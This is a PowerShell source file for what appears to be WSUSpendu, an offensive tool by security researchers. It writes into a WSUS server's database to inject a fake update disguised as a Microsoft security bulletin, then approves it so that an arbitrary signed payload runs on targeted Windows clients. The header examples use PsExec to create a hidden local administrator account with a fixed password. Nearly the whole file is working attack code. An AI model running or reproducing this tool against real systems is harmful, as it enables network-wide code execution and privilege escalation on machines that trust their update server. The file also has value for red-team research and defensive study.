<#
.SYNOPSIS
    Inject an newly created update in WSUS Server, executing an arbitrary command on targeted WSUS clients.

.DESCRIPTION
    This script injects a payload in WSUS server in order to be executed on a targeted computer.
    Execution policy needs to be configured to execute foreign script:
      Set-ExecutionPolicy -ExecutionPolicy unrestricted (or bypass)

.NOTES
   Authors: Yves Le Provost (yves.le-provost@ssi.gouv.fr) & Romain Coltel (romain.coltel@alsid.com)

   TODO:
   * Remote PowerShell: upload the PayloadFile

.PARAMETER PayloadFile
    File to be executed on the target. It MUST be signed (using Authenticode) by Microsoft or a trusted third-party.

.PARAMETER PayloadArgs
    Arguments to pass to the payload file.

.PARAMETER ComputerName
    This argument is the name of the target. The DNS fully qualified name has to be used.

.EXAMPLE
    Wsuspendu.ps1 -Inject -PayloadFile psexec.exe -PayloadArgs '-accepteula -s -d cmd.exe /c "net user Titi Password123_ /add && net localgroup Administrators Titi /add"' -ComputerName Win7.test.net
    	This will inject a new update executing PsExec.exe to add a new local administrator named Titi. This update will be approved only for the Win7.test.net computer.

.EXAMPLE
    Wsuspendu.ps1 -Inject -PayloadFile psexec.exe -PayloadArgs '-accepteula -s -d cmd.exe /c "net user Titi Password123_ /add && net localgroup Administrators Titi /add"'
    	This will inject a new update executing PsExec.exe to add a new local administrator named Titi. This update WON'T be approved for any computer by this script - meaning you can approve it manually, or it can be approved automatically with autoapproval rules.
#>

[CmdletBinding(DefaultParameterSetName = 'injectcase')]
Param(
   [Parameter (Mandatory = $False, ParameterSetName = 'injectcase')]
   [Parameter (Mandatory = $True, ParameterSetName = 'addcase')]
   [Parameter (Mandatory = $True, ParameterSetName = 'removecase')]
   [Parameter (Mandatory = $True, ParameterSetName = 'checkcase')]
   [string] $ComputerName = 'OnDownstreamServer',

   [Parameter (Mandatory = $True, ParameterSetName = 'injectcase', Position = 0)]
   [switch] $Inject,

   [Parameter (Mandatory = $True, ParameterSetName = 'injectcase')]
   [string] $PayloadFile,

   [Parameter (ParameterSetName = 'injectcase')]
   [string] $PayloadArgs,

   [Parameter (Mandatory = $True, ParameterSetName = 'cleancase', Position = 0)]
   [switch] $Clean,

   [Parameter (Mandatory = $True, ParameterSetName = 'cleancase')]
   [Parameter (Mandatory = $True, ParameterSetName = 'checkcase')]
   [string] $UpdateID,

   [Parameter (Mandatory = $True, ParameterSetName = 'addcase', Position = 0)]
   [switch] $Add,

   [Parameter (Mandatory = $True, ParameterSetName = 'removecase', Position = 0)]
   [switch] $Remove,

   [Parameter (Mandatory = $True, ParameterSetName = 'checkcase', Position = 0)]
   [switch] $Check,

   [switch] $Quiet = $False
)

function Connection
{
   $Conn = New-Object System.Data.SqlClient.SqlConnection
   $Version = (Get-WmiObject Win32_OperatingSystem).Version
   Write-Debug "OS Version : $Version"

   # Note: for a value of 'MICROSOFT##WID', we contact the server with 'np:\\.\pipe\MICROSOFT##WID\tsql\query'

   $SqlServerName = (Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Update Services\Server\setup').SqlServerName
   $SqlDatabaseName = (Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Update Services\Server\setup').SqlDatabaseName

   if ( ($SqlServerName -eq 'MICROSOFT##WID') -or ($SqlServerName -eq 'MSSQL$MICROSOFT##SSEE') )
   {

      if ($Version -lt 6.2.0)
      {
         # WID Win2008
         $Conn.ConnectionString = 'Server=np:\\.\pipe\MSSQL$MICROSOFT##SSEE\sql\query;Database='+$SqlDatabaseName+';Integrated Security=True'
      }
      else
      {
         # WID Win2012 and >
         $Conn.ConnectionString = 'Server=np:\\.\pipe\MICROSOFT##WID\tsql\query;Database='+$SqlDatabaseName+';Integrated Security=True'
      }
   }
   else
   {
      # SQL Server
      $Conn.ConnectionString = 'Server=' + $SqlServerName + ';Database='+$SqlDatabaseName+';Trusted_Connection=True'
   }

   try
   {
      $Conn.Open()
   }
   catch [System.Data.SqlClient.SqlException]
   {
      Write-Error "$_"
      Exit 2
   }

   return $Conn
}

function GetWSUSConfiguration
{
   if ($g_WSUSConfiguration)
   {
      return $g_WSUSConfiguration
   }

   $g_SQLCmd.CommandText = "exec spConfiguration"

   try
   {
      $Reader = $g_SQLCmd.ExecuteReader()
   }
   catch [System.Data.SqlClient.SqlException]
   {
      Write-Error "Error getting the configuration: $_"
      Exit 2
   }

   if ($Reader.Read())
   {
      $RegUsingSSL = Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Update Services\Server\setup' -Name UsingSSL
      $ComputerName = $env:COMPUTERNAME
      if ($env:USERDNSDOMAIN)
      {
         $ComputerName += '.' + $env:USERDNSDOMAIN
      }

      $g_WSUSConfiguration = New-Object -TypeName PSObject
      $g_WSUSConfiguration | Add-Member -MemberType NoteProperty -Name LocalContentCacheLocation -Value $Reader.GetValue($Reader.GetOrdinal('LocalContentCacheLocation'))
      $g_WSUSConfiguration | Add-Member -MemberType NoteProperty -Name ServerPortNumber -Value $Reader.GetValue($Reader.GetOrdinal('ServerPortNumber'))
      $g_WSUSConfiguration | Add-Member -MemberType NoteProperty -Name UsingSSL -Value $RegUsingSSL.UsingSSL
      $g_WSUSConfiguration | Add-Member -MemberType NoteProperty -Name FullComputerName -Value $ComputerName

      $Reader.Close()
   }
   else
   {
      Write-Error "Cannot read WSUS configuration"
      Exit 4
   }

   return $g_WSUSConfiguration
}

function GetUpdateDirectory
{
   $Configuration = GetWSUSConfiguration

   $IISLocation = $Configuration.LocalContentCacheLocation
   Write-Debug "IIS Folder: '$IISLocation'"

   if ($IISLocation.Length -eq 0)
   {
      Write-Error "Error retrieving IIS location path"
      Exit 3
   }
   return $IISLocation
}

function CopyFile([string] $FilePath, [string] $Destination)
{
   try
   {
      Copy-Item -Path $FilePath -Destination ($Destination + '\wuagent.exe')
   }
   catch
   {
      Write-Error "Copy file in IIS path: $_"
      Exit 4
   }
}

function RemoveFile([string] $Directory)
{
   Remove-Item -Path ($Directory + '\wuagent.exe')
}

function GetComputerTarget([string] $ComputerName)
{
   $g_SQLCmd.CommandText = "exec spGetComputerTargetByName @fullDomainName = N'$ComputerName'"

   try
   {
      $Reader = $g_SQLCmd.ExecuteReader()
   }
   catch [System.Data.SqlClient.SqlException]
   {
      Write-Error "$_"
      Exit 2
   }

   if ($Reader.Read())
   {
      $ComputerID = $Reader.GetValue($Reader.GetOrdinal('ComputerID'))
   }
   else
   {
      Write-Error "Computer $ComputerName cannot be found"
      Exit 4
   }

   $Reader.Close()

   if ($ComputerID.Length -eq 0)
   {
      Write-Error "Computer $ComputerName not found"
      Exit 4
   }

   $g_SQLCmd.CommandText = "SELECT dbo.fnGetComputerTargetID('$ComputerID')"

   try
   {
      $Reader = $g_SQLCmd.ExecuteReader()
   }
   catch [System.Data.SqlClient.SqlException]
   {
      Write-Error "$_"
      Exit 2
   }

   if ($Reader.Read())
   {
      $ComputerTargetID = $Reader.GetValue(0)
      Write-Debug "Computer target ID = '$ComputerTargetID'"
   }
   else
   {
      Write-Error "Internal WSUS database error: computer $ComputerName has ComputerID='$ComputerID', but doesn't have a TargetID"
      Exit 4
   }

   $Reader.Close()

   return $ComputerTargetID
}

function GetGroupID([string] $GroupName)
{
   $g_SQLCmd.CommandText = "exec spGetAllTargetGroups"

   try
   {
      $Reader = $g_SQLCmd.ExecuteReader()
   }
   catch [System.Data.SqlClient.SqlException]
   {
      Write-Error "$_"
      Exit 2
   }

   $TargetGroupID = $Null
   while ($Reader.Read())
   {
      $TargetGroupName = $Reader.GetValue($Reader.GetOrdinal('Name'))
      Write-Debug "Target group name = '$TargetGroupName'"

      if ($TargetGroupName -eq $GroupName)
      {
         $TargetGroupID = $Reader.GetValue($Reader.GetOrdinal('TargetGroupID'))
         Write-Debug "       group ID = '$TargetGroupID'"
         break;
      }
   }

   $Reader.Close()

   if (-not $TargetGroupID)
   {
      Write-Debug "Target group '$GroupName' has not been found"
   }

   return $TargetGroupID
}

function ImportUpdate([string] $UpdateGuid, [object] $OFile)
{
   $Datatable = New-Object System.Data.DataTable
   $g_SQLCmd.CommandText = '
declare @iImported int
declare @iLocalRevisionID int
exec spImportUpdate @UpdateXml=N''
<upd:Update xmlns:b="http://schemas.microsoft.com/msus/2002/12/LogicalApplicabilityRules" xmlns:pub="http://schemas.microsoft.com/msus/2002/12/Publishing" xmlns:cbs="http://schemas.microsoft.com/msus/2002/12/UpdateHandlers/Cbs" xmlns:cbsar="http://schemas.microsoft.com/msus/2002/12/CbsApplicabilityRules" xmlns:upd="http://schemas.microsoft.com/msus/2002/12/Update">
   <upd:UpdateIdentity UpdateID="' + $UpdateGuid + '" RevisionNumber="202" />
   <upd:Properties DefaultPropertiesLanguage="en" UpdateType="Software" Handler="http://schemas.microsoft.com/msus/2002/12/UpdateHandlers/Cbs" MaxDownloadSize="' + $OFile.Size + '" MinDownloadSize="' + $OFile.Size + '" PublicationState="Published" CreationDate="2013-10-08T00:03:55.912Z" PublisherID="395392a0-19c0-48b7-a927-f7c15066d905">
      <upd:InstallationBehavior RebootBehavior="CanRequestReboot" />
      <upd:UninstallationBehavior RebootBehavior="CanRequestReboot" />
   </upd:Properties>
   <upd:LocalizedPropertiesCollection>
      <upd:LocalizedProperties>
         <upd:Language>en</upd:Language>
         <upd:Title>Probably-legal-update</upd:Title>
      </upd:LocalizedProperties>
   </upd:LocalizedPropertiesCollection>
   <upd:ApplicabilityRules>
      <upd:IsInstalled><b:False /></upd:IsInstalled>
      <upd:IsInstallable><b:True /></upd:IsInstallable>
   </upd:ApplicabilityRules>
   <upd:Files>
      <upd:File Digest="' + $OFile.Digest.SHA1 + '" DigestAlgorithm="SHA1" FileName="' + $OFile.Name + '" Size="' + $OFile.Size + '" Modified="2010-11-25T15:26:20.723">
         <upd:AdditionalDigest Algorithm="SHA256">' + $OFile.Digest.SHA256 + '</upd:AdditionalDigest>
      </upd:File>
   </upd:Files>
   <upd:HandlerSpecificData xsi:type="cmd:CommandLineInstallation" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:pub="http://schemas.microsoft.com/msus/2002/12/Publishing">
      <cmd:InstallCommand Arguments="' + $OFile.Args + '" Program="' + $OFile.Name + '" RebootByDefault="false" DefaultResult="Succeeded" xmlns:cmd="http://schemas.microsoft.com/msus/2002/12/UpdateHandlers/CommandLineInstallation">
         <cmd:ReturnCode Reboot="false" Result="Succeeded" Code="0" />
      </cmd:InstallCommand>
   </upd:HandlerSpecificData>
</upd:Update>'',@UpstreamServerLocalID=1,@Imported=@iImported output,@localRevisionID=@iLocalRevisionID output,@UpdateXmlCompressed=NULL
select @iImported,@iLocalRevisionID
   '

   try
   {
      $Reader = $g_SQLCmd.ExecuteReader()
   }
   catch [System.Data.SqlClient.SqlException]
   {
      Write-Error "Error when creating update: $_"
      Exit 2
   }

   $Datatable.Load($Reader)
   $Reader.Close()

   return $Datatable.Rows[0].Column2
}

function PrepareXmlToClient([string] $UpdateGuid, [object] $OFile)
{
   $g_SQLCmd.CommandText = "
exec spSaveXmlFragment '" + $UpdateGuid + "',202,1,N'&lt;UpdateIdentity UpdateID=""" + $UpdateGuid + """ RevisionNumber=""202"" /&gt;&lt;Properties UpdateType=""Software"" /&gt;&lt;Relationships&gt;&lt;/Relationships&gt;&lt;ApplicabilityRules&gt;&lt;IsInstalled&gt;&lt;False /&gt;&lt;/IsInstalled&gt;&lt;IsInstallable&gt;&lt;True /&gt;&lt;/IsInstallable&gt;&lt;/ApplicabilityRules&gt;',NULL

exec spSaveXmlFragment
'" + $UpdateGuid + "',202,4,N'&lt;LocalizedProperties&gt;&lt;Language&gt;en&lt;/Language&gt;&lt;Title&gt;Probably-legal-update&lt;/Title&gt;&lt;/LocalizedProperties&gt;',NULL,'en'

exec spSaveXmlFragment
'" + $UpdateGuid + "',202,2,N'&lt;ExtendedProperties DefaultPropertiesLanguage=""en"" Handler=""http://schemas.microsoft.com/msus/2002/12/UpdateHandlers/CommandLineInstallation"" MaxDownloadSize=""" + $OFile.Size + """ MinDownloadSize=""" + $OFile.Size + """&gt;&lt;InstallationBehavior RebootBehavior=""NeverReboots"" /&gt;&lt;/ExtendedProperties&gt;&lt;Files&gt;&lt;File Digest=""" + $OFile.Digest.SHA1 + """ DigestAlgorithm=""SHA1"" FileName=""" + $OFile.Name + """ Size=""" + $OFile.Size + """ Modified=""2010-11-25T15:26:20.723""&gt;&lt;AdditionalDigest Algorithm=""SHA256""&gt;" + $OFile.Digest.SHA256 + "&lt;/AdditionalDigest&gt;&lt;/File&gt;&lt;/Files&gt;&lt;HandlerSpecificData type=""cmd:CommandLineInstallation""&gt;&lt;InstallCommand Arguments=""" + $OFile.Args + """ Program=""" + $OFile.Name + """ RebootByDefault=""false"" DefaultResult=""Succeeded""&gt;&lt;ReturnCode Reboot=""false"" Result=""Succeeded"" Code=""-1"" /&gt;&lt;/InstallCommand&gt;&lt;/HandlerSpecificData&gt;',NULL
    "

   try
   {
      $Reader = $g_SQLCmd.ExecuteReader()
   }
   catch [System.Data.SqlClient.SqlException]
   {
      Write-Error "$_"
      Exit 2
   }
   $Reader.Close()
}

function InjectUrl2Download([object] $OFile)
{
   $Configuration = GetWSUSConfiguration

   $muurl = 'http'
   if ($Configuration.UsingSSL)
   {
      $muurl += 's'
   }
   $muurl += '://' + $Configuration.FullComputerName + ':' + $Configuration.ServerPortNumber + '/Content/wuagent.exe'

   $g_SQLCmd.CommandText = 'exec spSetBatchURL @urlBatch =N''<ROOT><item FileDigest="' + $OFile.Digest.SHA1 + '" MUURL="' + $muurl + '" USSURL="" /></ROOT>'''

   try
   {
      $Reader = $g_SQLCmd.ExecuteReader()
   }
   catch [System.Data.SqlClient.SqlException]
   {
      Write-Error "$_"
      Exit 2
   }
   $Reader.Close()
}

function DeploymentRevision([int] $LocalRevisionID)
{
   $g_SQLCmd.CommandText = 'exec spDeploymentAutomation @revisionID=' + $LocalRevisionID
   try
   {
      $Reader = $g_SQLCmd.ExecuteReader()
   }
   catch [System.Data.SqlClient.SqlException]
   {
      Write-Error "$_"
      Exit 2
   }
   $Reader.Close()
}

function PrepareBundle([object] $OGuid)
{
   $Datatable = New-Object System.Data.DataTable
   $g_SQLCmd.CommandText = '
declare @iImported int
declare @iLocalRevisionID int
exec spImportUpdate @UpdateXml=N''
<upd:Update xmlns:pub="http://schemas.microsoft.com/msus/2002/12/Publishing" xmlns:upd="http://schemas.microsoft.com/msus/2002/12/Update">
   <upd:UpdateIdentity UpdateID="' + $OGuid.Bundle + '" RevisionNumber="204" />
   <upd:Properties DefaultPropertiesLanguage="en" UpdateType="Software" ExplicitlyDeployable="true" AutoSelectOnWebSites="true" MsrcSeverity="Important" IsPublic="false" IsBeta="false" PublicationState="Published" CreationDate="2013-10-08T17:00:00.000Z" PublisherID="395392a0-19c0-48b7-a927-f7c15066d905" LegacyName="KB2862335-Win7-SP1-X86-TSL">
      <upd:SupportUrl>http://ssi.gouv.fr</upd:SupportUrl>
      <upd:SecurityBulletinID>MS42-007</upd:SecurityBulletinID>
      <upd:KBArticleID>2862335</upd:KBArticleID>
   </upd:Properties>
   <upd:LocalizedPropertiesCollection>
      <upd:LocalizedProperties>
         <upd:Language>en</upd:Language>
         <upd:Title>Bundle update for * Windows (from KB2862335)</upd:Title>
         <upd:Description>A security issue has been identified in a Microsoft software product that could affect your system. You can help protect your system by installing this update from Microsoft. For a complete listing of the issues that are included in this update, see the associated Microsoft Knowledge Base article. After you install this update, you may have to restart your system.</upd:Description>
         <upd:UninstallNotes>This software update can be removed by selecting View installed updates in the Programs and Features Control Panel.</upd:UninstallNotes>
         <upd:MoreInfoUrl>http://alsid.eu</upd:MoreInfoUrl>
         <upd:SupportUrl>http://ssi.gouv.fr</upd:SupportUrl>
      </upd:LocalizedProperties>
   </upd:LocalizedPropertiesCollection>
   <upd:Relationships>
      <upd:Prerequisites>
         <upd:AtLeastOne IsCategory="true">
            <upd:UpdateIdentity UpdateID="0fa1201d-4330-4fa8-8ae9-b877473b6441" />
         </upd:AtLeastOne>
      </upd:Prerequisites>
      <upd:BundledUpdates>
         <upd:UpdateIdentity UpdateID="' + $OGuid.Update + '" RevisionNumber="202" />
      </upd:BundledUpdates>
   </upd:Relationships>
</upd:Update>'',@UpstreamServerLocalID=1,@Imported=@iImported output,@localRevisionID=@iLocalRevisionID output,@UpdateXmlCompressed=NULL
select @iImported, @iLocalRevisionID'

   try
   {
      $Reader = $g_SQLCmd.ExecuteReader()
   }
   catch [System.Data.SqlClient.SqlException]
   {
      Write-Error "Error when creating the Bundle update: $_"
      Exit 2
   }
   $Datatable.Load($Reader)
   $Reader.Close()

   return $Datatable.Rows[0].Column2
}

function PrepareXmlBundleToClient([object] $OGuid)
{
   $g_SQLCmd.CommandText = "
exec spSaveXmlFragment '" + $OGuid.Bundle + "',204,1,N'&lt;UpdateIdentity UpdateID=""" + $OGuid.Bundle + """ RevisionNumber=""204"" /&gt;&lt;Properties UpdateType=""Software"" ExplicitlyDeployable=""true"" AutoSelectOnWebSites=""true"" /&gt;&lt;Relationships&gt;&lt;Prerequisites&gt;&lt;AtLeastOne IsCategory=""true""&gt;&lt;UpdateIdentity UpdateID=""0fa1201d-4330-4fa8-8ae9-b877473b6441"" /&gt;&lt;/AtLeastOne&gt;&lt;/Prerequisites&gt;&lt;BundledUpdates&gt;&lt;UpdateIdentity UpdateID=""" + $OGuid.Update + """ RevisionNumber=""202"" /&gt;&lt;/BundledUpdates&gt;&lt;/Relationships&gt;',NULL

exec spSaveXmlFragment '" + $OGuid.Bundle + "',204,4,N'&lt;LocalizedProperties&gt;&lt;Language&gt;en&lt;/Language&gt;&lt;Title&gt;Bundle Security Update for * Windows (from KB2862335)&lt;/Title&gt;&lt;Description&gt;A security issue has been identified in a Microsoft software product that could affect your system. You can help protect your system by installing this update from Microsoft. For a complete listing of the issues that are included in this update, see the associated Microsoft Knowledge Base article. After you install this update, you may have to restart your system.&lt;/Description&gt;&lt;UninstallNotes&gt;This software update can be removed by selecting View installed updates in the Programs and Features Control Panel.&lt;/UninstallNotes&gt;&lt;MoreInfoUrl&gt;http://alsid.eu&lt;/MoreInfoUrl&gt;&lt;SupportUrl&gt;http://ssi.gouv.fr&lt;/SupportUrl&gt;&lt;/LocalizedProperties&gt;',NULL,'en'

exec spSaveXmlFragment '" + $OGuid.Bundle + "',204,2,N'&lt;ExtendedProperties DefaultPropertiesLanguage=""en"" MsrcSeverity=""Important"" IsBeta=""false""&gt;&lt;SupportUrl&gt;http://ssi.gouv.fr&lt;/SupportUrl&gt;&lt;SecurityBulletinID&gt;MS42-007&lt;/SecurityBulletinID&gt;&lt;KBArticleID&gt;2862335&lt;/KBArticleID&gt;&lt;/ExtendedProperties&gt;',NULL
   "

   try
   {
      $Reader = $g_SQLCmd.ExecuteReader()
   }
   catch [System.Data.SqlClient.SqlException]
   {
      Write-Error "$_"
      Exit 2
   }
   $Reader.Close()
}

function CreateGroup([string] $GroupName, [string] $GroupID)
{
   $g_SQLCmd.CommandText = "exec spCreateTargetGroup @name='" + $GroupName + "', @id='" + $GroupID + "'"
   try
   {
      $Reader = $g_SQLCmd.ExecuteReader()
   }
   catch [System.Data.SqlClient.SqlException]
   {
       Write-Error "Error when create TargetGroup $GroupName (GUID=$GroupID) : $_"
       Exit 2
   }
   $Reader.Close()
}

function RemoveComputerFromGroup([string] $GroupID, [int] $ComputerTargetID)
{
   $g_SQLCmd.CommandText = "exec spRemoveTargetFromTargetGroup @targetGroupID='" + $GroupID + "', @targetID=" + $ComputerTargetID
   try
   {
      $Reader = $g_SQLCmd.ExecuteReader()
   }
   catch [System.Data.SqlClient.SqlException]
   {
      Write-Error "Error when remove target $ComputerTargetID in target Group $($GroupID): $_"
      Exit 2
   }
   $Reader.Close()
}

function AddComputerToGroup([string] $GroupID, [int] $ComputerTargetID)
{
   <# Note:
   We're not using spAddComputerToTargetGroupAllowMultipleGroups, because we don't want $Computer to be removed
   from the Unassigned Computers group, if it's already in, by this procedure. Using spAddTargetToTargetGroup directly
   ensures us this is not done, but needs the targetID, which is what our GetComputerTarget function is for.
   #>
   $g_SQLCmd.CommandText = "exec spAddTargetToTargetGroup @targetGroupID='" + $GroupID + "', @targetID=" + $ComputerTargetID

   try
   {
      $Reader = $g_SQLCmd.ExecuteReader()
   }
   catch [System.Data.SqlClient.SqlException]
   {
      Write-Error "Error when add target $ComputerTargetID in target Group $($GroupID): $_"
      Exit 2
   }
   $Reader.Close()
}

function RemoveGroup([string] $GroupID)
{
   $g_SQLCmd.CommandText="exec spDeleteTargetGroup @targetGroupID='" + $GroupID + "'";
   try
   {
      $Reader = $g_SQLCmd.ExecuteReader()
   }
   catch [System.Data.SqlClient.SqlException]
   {
      Write-Error "Error when remove group $($GroupID): $_"
      Exit 2
   }
   $Reader.Close()
}

function DeleteUpdate([string] $UpdateID)
{
   $g_SQLCmd.CommandText = "exec spDeclineUpdate @updateID='" + $UpdateID + "'"
   try
   {
      $Reader = $g_SQLCmd.ExecuteReader()
   }
   catch [System.Data.SqlClient.SqlException]
   {
      Write-Error "Error when decline update $($UpdateID): $_"
      Exit 2
   }
   $Reader.Close()

   $g_SQLCmd.CommandText = "exec spDeleteUpdateByUpdateID @updateID='" + $UpdateID + "'"
   try
   {
      $Reader = $g_SQLCmd.ExecuteReader()
   }
   catch [System.Data.SqlClient.SqlException]
   {
      Write-Error "Error when delete update $($UpdateID): $_"
      Exit 2
   }
   $Reader.Close()
}

function ApproveUpdate ([string] $UpdateID, [string] $GroupID)
{

   $g_SQLCmd.CommandText = "exec spDeployUpdate @updateID='" + $UpdateID + "',@revisionNumber=204,@actionID=0,@targetGroupID='" + $GroupID + "',@adminName=N'WUS Server',@isAssigned=1,@downloadPriority=1,@failIfReplica=0,@isReplica=0"
   try
   {
      $Reader = $g_SQLCmd.ExecuteReader()
   }
   catch [System.Data.SqlClient.SqlException]
   {
      Write-Error "Error when deploy updateID $UpdateID for target group $($GroupID): $_"
      Exit 2
   }
   $Reader.Close()
}

function GetFileHashInBase64([string] $FileName, [string] $Algo)
{
    $hash = (Get-FileHash -path $FileName -Algorithm $Algo).Hash
    $hashBytesArray = $hash -split '(?<=\G..)(?=.)'
    $hashHexArray = $hashBytesArray | ForEach-Object { [byte]::Parse($_, 'HexNumber') }
    [Convert]::ToBase64String(@($hashHexArray))
}

<# main #>

$global:g_WSUSConfiguration = $Null
$global:g_SQLCmd = New-Object System.Data.SqlClient.SqlCommand
$GroupName = 'InjectionGroup'
$g_SQLCmd.Connection = Connection

if ($Inject)
{
   Add-Type -AssemblyName System.web

   if (-not (Test-Path $PayloadFile))
   {
      Write-Error "Cannot find '$PayloadFile', aborting."
      Exit 4
   }

   $Guid = @{
                Update = [guid]::NewGuid();
                Bundle = [guid]::NewGuid();
                TargetGroup = [guid]::NewGuid();
            }

   $File = @{  Name = [System.IO.Path]::GetFileName($PayloadFile);
               Path = $PayloadFile;
               Args = [system.web.httputility]::htmlencode([System.web.httputility]::htmlencode($PayloadArgs));
               Size = (Get-ChildItem $PayloadFile | Measure-Object -property Length -sum).Sum
               Digest = @{
                             SHA1 = GetFileHashInBase64 -FileName $PayloadFile -Algo 'SHA1'
                             SHA256 = GetFileHashInBase64 -FileName $PayloadFile -Algo 'SHA256'
                         }
            }
   $Dir = GetUpdateDirectory
   CopyFile -FilePath $File.Path -Destination $Dir

   if ($ComputerName -ne 'OnDownstreamServer')
   {
      $TargetID = GetComputerTarget -ComputerName $ComputerName
      $TargetGroupID = GetGroupID -GroupName $GroupName

      if ($TargetGroupID)
      {
         $IsGroupExist = $True
         $Guid.TargetGroup = $TargetGroupID
      }
      else
      {
         $IsGroupExist = $False
      }
   }

   $LocalRevisionID = ImportUpdate -UpdateGuid $Guid.Update -OFile $File

   Write-Verbose "Update's local revision ID: $LocalRevisionID"

   if ($LocalRevisionID -eq 0)
   {
      Write-Error "Error when importing update: no update was created"
      Exit 3
   }

   Write-Verbose "Injected Update's GUID: $($Guid.Update)"

   PrepareXmlToClient -UpdateGuid $Guid.Update -OFile $File
   InjectUrl2Download -OFile $File
   DeploymentRevision -LocalRevisionID $LocalRevisionID

   $LocalRevisionID = PrepareBundle -OGuid $Guid
   Write-Verbose "Bundle's local revision ID: $LocalRevisionID"

   if ($LocalRevisionID -eq 0)
   {
      Write-Error "Error when importing Bundle: no update was created"
      Exit 3
   }
   Write-Verbose "Injected bundle's GUID: $($Guid.Bundle)"

   PrepareXmlBundleToClient -OGuid $Guid
   DeploymentRevision -LocalRevisionID $LocalRevisionID

   if ($ComputerName -ne 'OnDownstreamServer')
   {
      if ($IsGroupExist)
      {
         Write-Verbose "Group $GroupName already created"
      }
      else
      {
         CreateGroup -GroupName $GroupName -GroupID $Guid.TargetGroup
         Write-Verbose "Group '$GroupName' created. GUID: $($Guid.TargetGroup)"
      }

      AddComputerToGroup -GroupID $Guid.TargetGroup -ComputerTargetID $TargetID
      Write-Verbose "Computer $ComputerName (targetID $TargetID) added in target group $($Guid.TargetGroup)"

      ApproveUpdate -UpdateID $Guid.Bundle -GroupID $Guid.TargetGroup

      Write-Verbose "Update $($Guid.Bundle) deployed for target group $($Guid.TargetGroup)"
   }
   else
   {
      Write-Verbose "Not adding any computer target to any group: we assume the update is for workstations attached to a downstream server"
   }

   Write-Output "Everything seems ok. Wait for the client to take the update now..."
   Write-Output "To clean the injection, execute the following command:"
   Write-Output ".\Wsuspendu.ps1 -Clean -UpdateID $($Guid.Bundle)"
   if ($ComputerName -ne 'OnDownstreamServer')
   {
      Write-Output "To check the update status, execute the following command:"
      Write-Output ".\Wsuspendu.ps1 -check -UpdateID $($Guid.Bundle) -ComputerName $($ComputerName)"
   }
   else
   {
      Write-Output "To check the update status for a specific computer, execute the following command:"
      Write-Output ".\Wsuspendu.ps1 -check -UpdateID $($Guid.Bundle) -ComputerName [Computer name]"
   }
   Write-Host -ForegroundColor Green "Done"
}

if ($Add)
{
   $TargetGroupID = GetGroupID -GroupName $GroupName
   if (-not $TargetGroupID)
   {
      Write-Error "You can't add a computer if the injection group '$GroupName' doesn't exist"
      Exit 4
   }

   $ComputerID = GetComputerTarget -ComputerName $ComputerName
   AddComputerToGroup -GroupID $TargetGroupID -ComputerTargetID $ComputerID
   Write-Host -ForegroundColor Green "Done"
}

if ($Remove)
{
   $TargetGroupID = GetGroupID -GroupName $GroupName
   if (-not $TargetGroupID)
   {
      Write-Error "You can't remove a computer of an injection group ('$GroupName') that doesn't exist"
      Exit 4
   }

   $ComputerID = GetComputerTarget -ComputerName $ComputerName
   RemoveComputerFromGroup -GroupID $TargetGroupID -ComputerTargetID $ComputerID
   Write-Host -ForegroundColor Green "Done"
}

if ($Clean)
{
   $TargetGroupID = GetGroupID -GroupName $GroupName
   if ($TargetGroupID)
   {
      # Just in case one would want to apply the update on a different group name
      $DefaultGroupIDs = @('B73CA6ED-5727-47F3-84DE-015E03F6A88A', # Unassigned Computers
                           'D374F42A-9BE2-4163-A0FA-3C86A401B7A7', # Downstream servers
                           'A0A08746-4DBE-4A37-9ADF-9E7652C0B421') # All Computers
      if ($DefaultGroupIDs -contains $TargetGroupID)
      {
         Write-Verbose "Cannot delete a default group (this will most probably break the WSUS installation)"
      }
      else
      {
         RemoveGroup -GroupID $TargetGroupID
      }
   }

   DeleteUpdate -UpdateID $UpdateID
   $Dir = GetUpdateDirectory
   RemoveFile -Directory $Dir
   Write-Host -ForegroundColor Green "Done"
}

if($Check)
{
   $TargetID = GetComputerTarget -ComputerName $ComputerName


   $g_SQLCmd.CommandText = "SELECT LocalUpdateID FROM dbo.tbUpdate WHERE UpdateID = '$UpdateID'"
   try
   {
      $Reader = $g_SQLCmd.ExecuteReader()
   }
   catch [System.Data.SqlClient.SqlException]
   {
      Write-Error "$_"
      Exit 2
   }

   if ($Reader.Read())
   {
      $LocalUpdateID = $Reader.GetValue($Reader.GetOrdinal('LocalUpdateID'))
   }
   else
   {
      Write-Error "UpdateID $UpdateID cannot be found"
      Exit 4
   }
   $Reader.Close()

   $g_SQLCmd.CommandText = "SELECT SummarizationState FROM dbo.tbUpdateStatusPerComputer WHERE LocalUpdateID=$LocalUpdateID AND TargetID=$TargetID"
   try
   {
      $Reader = $g_SQLCmd.ExecuteReader()
   }
   catch [System.Data.SqlClient.SqlException]
   {
      Write-Error "$_"
      Exit 2
   }

   if ($Reader.Read())
   {
      $SummarizationState = $Reader.GetValue($Reader.GetOrdinal('SummarizationState'))
      switch ($SummarizationState)
      {
         2 { Write-Host '> Update is not installed'; break }
         3 { Write-Host '> Update is downloaded'; break }
         4 { Write-Host '> Update is installed'; break }
         5 { Write-Host '> Update failed'; break }
         default { Write-Host "x Unknown state: $SummarizationState" }
      }
   }
   else
   {
      Write-Host -ForegroundColor Red "Update Info cannot be found"
      Exit 4
   }
   $Reader.Close()
}

$g_SQLCmd.Connection.Close()
